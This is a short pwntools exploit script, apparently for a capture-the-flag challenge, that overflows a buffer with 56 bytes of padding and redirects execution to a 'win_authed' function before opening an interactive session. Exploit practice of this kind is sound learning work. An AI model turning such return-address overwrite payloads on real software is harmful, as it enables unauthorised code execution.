def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

padding = b'A' *  56
pl = padding + p64(exe.sym.win_authed+28)

p.sendline(b'200')
#p.sendline(b'10')
p.send(pl)
p.interactive()
